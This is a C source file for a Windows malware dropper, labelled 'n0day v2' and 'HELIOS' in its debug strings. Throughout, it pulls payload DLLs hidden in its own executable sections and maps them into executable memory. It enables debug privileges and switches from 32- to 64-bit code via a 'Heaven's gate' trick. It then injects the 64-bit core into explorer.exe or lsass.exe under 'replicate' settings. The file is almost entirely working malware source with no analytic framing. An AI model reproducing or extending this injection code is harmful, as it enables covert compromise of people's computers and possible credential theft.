#include "../CORE32/main.h"
#include "resource.h"


//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")


INT main()
{
	ERROR_CODE				status;

	SYSTEM_INFO				system_info				= {0};

	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;
	PIMAGE_SECTION_HEADER	section_header;
	LPTHREAD_START_ROUTINE	oep;
	
	HGLOBAL					global;
	HRSRC					resource;

	PDWORD					dll, virtual_dll;
	UINT					dll_size;
	INT						i;

#ifdef DEBUG_OUT
	printf("n0day v2 Dropper Initializing\n");
#endif

#ifdef NICE_DEBUG
	printf("HELIOS v0.1\n\tDropper initializing...\n\n");
#endif

	// Get CPU Architecture
	GetNativeSystemInfo(&system_info);

#ifdef X86_OVERRIDE
#ifdef DEBUG_OUT
	printf("WARNING WARNING WARNING: CORE32 OVERRIDE\n");
#endif
	system_info.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_INTEL;
#endif

	if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		status = get_pointer_to_payload(&dll, DLL32);

#ifdef DEBUG_OUT
		printf("[+] Using 32-bit core.\n");
#endif

		// Map DLL to local memory
		dos_header		= (PIMAGE_DOS_HEADER)dll;
		nt_headers		= (PIMAGE_NT_HEADERS)((SIZE_T)dll + dos_header->e_lfanew);
		section_header	= IMAGE_FIRST_SECTION(nt_headers);

		// Copy headers
		virtual_dll = (PDWORD)VirtualAlloc(	(LPVOID)nt_headers->OptionalHeader.ImageBase,
											nt_headers->OptionalHeader.SizeOfImage,
											MEM_RESERVE | MEM_COMMIT,
											PAGE_EXECUTE_READWRITE);

		CopyMemory(virtual_dll, dll, nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy sections
		section_header = IMAGE_FIRST_SECTION(nt_headers);
		for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
			if (section_header->PointerToRawData == 0) {
				section_header++;
				continue;
			}

			CopyMemory(	(void *)((DWORD)virtual_dll + section_header->VirtualAddress),
						(void *)((DWORD)dll + section_header->PointerToRawData),
						(size_t)section_header->SizeOfRawData);

			section_header++;
		}

#ifdef DEBUG_OUT
		printf("[+] Image copied\n");
#endif

		oep = (LPTHREAD_START_ROUTINE)((DWORD)locate_dll_entry_point(virtual_dll, (LPCSTR)DROPPER_ENTRY_POINT, NULL) + nt_headers->OptionalHeader.ImageBase);

#ifdef DEBUG_OUT
		printf("[+] Entrypoint determined\n");
#endif

#ifdef DEBUG_OUT
		printf("[+] Passing control to 0x%08x\n", oep);
#endif

		//BREAK;

#ifdef NICE_DEBUG
		printf("Loading HELIOS CORE32\n\n");
#endif
	
		CreateThread(	NULL,
						0,
						oep,
						dll,
						0,
						NULL);

		//Sleep(5000);

#ifdef DEBUG_OUT
		debug_catcher();
#elif defined NICE_DEBUG
		debug_catcher();
#endif

		return 0;
	} else if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {

#ifdef DEBUG_OUT
		printf("[+] Using 64-bit core.\n");
#endif

		// Obtain Loader Shellcode resource
		resource	= FindResource(NULL, MAKEINTRESOURCE(IDR_LOADER_SHELLCODE1), L"LOADER_SHELLCODE"); 
		global		= LoadResource(NULL, resource);

#ifdef DEBUG_OUT
		printf("[+] Shellcode loaded\n");
#endif
		status = get_pointer_to_payload(&dll, DLL64);

		status = initialize_CORE64(dll, (PDWORD)global, (UINT)SizeofResource(NULL, resource));
		if (!status) {

#ifdef DEBUG_OUT
			printf("[+] Error loading CORE64");
#endif

			return 0;
		}

#ifdef DEBUG_OUT
		debug_catcher();
#endif

		
	} else {
#ifdef DEBUG_OUT
		printf("[!] Unsupported architecture\n");
#endif

		return 0;
	}
}

BOOL initialize_CORE64(	PDWORD	core64,
						PDWORD	shellcode,
						UINT	core64_raw_size)
{
	PCORE64_SHELL_PARMS			core_parms;

	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		section_header;

	HANDLE						process;

	PDWORD						raw_image,
								heavens_gate_absolute;

	LPTHREAD_START_ROUTINE		core64_oep_rva;
	PDWORD						eat_raw;

	VOID						(*shell_oep)(LPVOID);

	// Get privileges
	if (enable_debug_priv() == FALSE) {
#ifdef DEBUG_OUT
		printf("[!] Failed to allocate privileges\n");
		return FALSE;
#endif
	}

	// Get headers
	dos_header			= (PIMAGE_DOS_HEADER)shellcode;
	nt_headers			= (PIMAGE_NT_HEADERS)((SIZE_T)shellcode + dos_header->e_lfanew);

	// Allocate memory for image
	raw_image			= (PDWORD)VirtualAlloc(NULL, nt_headers->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	CopyMemory(raw_image, shellcode, nt_headers->OptionalHeader.SizeOfImage);

	// Get new headers
	nt_headers			= (PIMAGE_NT_HEADERS)((SIZE_T)raw_image + dos_header->e_lfanew);
	section_header		= IMAGE_FIRST_SECTION(nt_headers);

	// Test our headers
	if (dos_header->e_magic != 'ZM' || nt_headers->Signature != 'EP') {
		return FALSE;
	}

	// Set function pointer
	shell_oep			= (VOID (*)(LPVOID))((SIZE_T)raw_image + section_header->PointerToRawData);

	// Install the Heaven's gate absolute jump x86 -> x64
	heavens_gate_absolute	= (PDWORD)((SIZE_T)shell_oep + 6);
	*heavens_gate_absolute	= (DWORD)((SIZE_T)shell_oep + 23);

	// Compute the return addy from x64 into x86 space


	// Get the process PID
	process = open_random_target();
	if (process == 0) {
#ifdef DEBUG_OUT
		printf("[!] Failed to open a process!\n");
#endif
		return FALSE;
	}

	// Create structure
	core_parms						= (PCORE64_SHELL_PARMS)HeapAlloc(GetProcessHeap(), 0, sizeof(CORE64_SHELL_PARMS));
	ZeroMemory((PVOID)core_parms, sizeof(CORE64_SHELL_PARMS));

	//BREAK;
	core_parms->core64_raw			= (LPVOID)core64;
	core_parms->target_process		= process;
	core_parms->core64_oep			= get_core64_entry(core64, DROPPER_ENTRY_POINT64);
	core_parms->core64_raw_size		= core64_raw_size;

	// Create our shellcode thread
#ifdef DEBUG_OUT
	printf("[+] CORE64 Entry Point: 0x%08x\n", shell_oep);
#endif
	CreateThread(	NULL,
					0,
					(LPTHREAD_START_ROUTINE)shell_oep,
					(LPVOID)core_parms,
					0,
					NULL);

	return TRUE;
}

DWORD get_core64_entry(PDWORD raw_base, LPCSTR export_name)
{
	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		section_header;

	PDWORD						virtual_base;
	UINT						i;


	// Get headers
	dos_header			= (PIMAGE_DOS_HEADER)raw_base;
	nt_headers			= (PIMAGE_NT_HEADERS)((SIZE_T)raw_base + dos_header->e_lfanew);
	section_header		= IMAGE_FIRST_SECTION(nt_headers);

	// Map
	virtual_base		= (PDWORD)VirtualAlloc(NULL, nt_headers->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	CopyMemory(	virtual_base,
				raw_base,
				nt_headers->OptionalHeader.SizeOfHeaders);

	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
		CopyMemory(	(PVOID)((DWORD)virtual_base + section_header->VirtualAddress),
					(PVOID)((DWORD)raw_base + section_header->PointerToRawData),
					section_header->SizeOfRawData);
		section_header++;
	}

	return (DWORD)locate_dll_entry_point(virtual_base, export_name, NULL);
}

HANDLE open_random_target(VOID)
{
	HANDLE						process							= NULL;
	DWORD						pid_array[MAX_PIDS]				= {0};
	UINT						i;

	if ((REPLICATE_STANDARD == TRUE) || (REPLICATE_TO_EXPLORER == TRUE)) {
		find_pid("explorer.exe", pid_array);
	} else if (REPLICATE_TO_LSASS == TRUE) {
		find_pid("lsass.exe", pid_array);
	} else {
		return NULL;
	}

	i = 0;
	while (TRUE) {
		process = OpenProcess(	PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
								FALSE,
								pid_array[i]);

		if (process != NULL) {
			break;
		}

		i++;

		if (pid_array[i] == 0) {
			return 0;
		}
	}

	return process;
}

BOOL get_pointer_to_payload(PDWORD *payload, DWORD type)
{
	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;
	PIMAGE_SECTION_HEADER	section_header;
	PDWORD					local_exe_base;
	UINT					i;

	// Get our module handle
	local_exe_base = (PDWORD)GetModuleHandle(NULL);

	dos_header		= (PIMAGE_DOS_HEADER)local_exe_base;
	nt_headers		= (PIMAGE_NT_HEADERS)((SIZE_T)local_exe_base + dos_header->e_lfanew);
	section_header	= IMAGE_FIRST_SECTION(nt_headers);

	// Go through all the sections until an MZ & PE header is found
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {

		if (*(PWORD)((SIZE_T)local_exe_base + section_header->VirtualAddress) == 'ZM') {

			// Check the request for a 64-bit DLL
			if (type == DLL64) {
				section_header++;

				*payload	= (PDWORD)((SIZE_T)local_exe_base + section_header->VirtualAddress);

				return TRUE;
			} else {

				*payload = (PDWORD)((SIZE_T)local_exe_base + section_header->VirtualAddress);

				return TRUE;
			}
		}

		section_header++;
	}

	return FALSE;
}

